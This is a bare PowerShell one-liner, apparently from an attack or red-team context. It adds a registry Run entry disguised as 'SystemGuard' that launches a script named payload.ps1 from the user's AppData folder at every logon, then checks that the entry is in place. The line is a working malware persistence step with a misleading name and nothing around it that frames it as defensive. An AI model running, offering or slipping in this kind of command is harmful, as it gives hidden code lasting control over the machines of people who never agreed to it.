
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemGuard' -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\payload.ps1" + '"') -PropertyType String -Force; Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemGuard'; Start-Sleep -Seconds 7; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
